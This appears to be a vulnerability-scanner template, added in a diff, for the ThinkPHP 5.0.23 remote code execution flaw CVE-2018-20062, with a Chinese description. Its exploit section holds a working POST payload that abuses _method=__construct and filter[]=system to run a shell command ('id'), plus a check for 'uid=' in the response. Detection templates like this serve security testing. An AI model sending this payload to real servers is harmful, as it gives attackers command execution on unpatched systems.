@@ -1,0 +1,34 @@
+{
+  "product": "ThinkPHP",
+  "vul_name": "ThinkPHP 5.0.23 任意代码执行",
+  "type": "代码执行",
+  "vul_id": [
+    "CVE-2018-20062"
+  ],
+  "level": 3,
+  "vul_desc": "在ThinkPHP 5.0.23以前的版本中，获取method的方法中没有正确处理方法名，导致攻击者可以调用Request类任意方法并构造利用链，从而导致远程代码执行漏洞。",
+  "version": "5.x < 5.1.31, <= 5.0.23",
+  "note": "",
+  "search": {},
+  "protocol": "http",
+  "link": "https://www.cnblogs.com/dustfree/p/17617791.html",
+  "fix": [],
+  "exploit": {
+    "exp": {
+      "method": "post",
+      "follow": false,
+      "path": "/index.php?s=captcha",
+      "data": "_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=id"
+    },
+    "verify": {
+      "path": "",
+      "logic": "and",
+      "check": [
+        {
+          "status": 200,
+          "body": "uid="
+        }
+      ]
+    }
+  }
+}
